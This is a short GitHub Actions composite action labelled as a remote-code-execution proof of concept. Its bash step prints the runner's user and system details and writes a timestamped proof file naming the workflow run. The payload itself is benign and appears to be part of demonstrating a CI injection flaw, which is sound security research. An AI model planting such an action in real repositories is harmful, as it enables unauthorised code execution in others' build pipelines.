runs:
  using: "composite"
  steps:
    - shell: bash
      run: |
        echo "[RCE-POC] whoami=$(whoami)"
        echo "[RCE-POC] uname=$(uname -a)"
        echo "ran at $(date -u +'%Y-%m-%dT%H:%M:%SZ') on run $GITHUB_RUN_ID" > RCE_PROOF.txt
        ls -la RCE_PROOF.txt
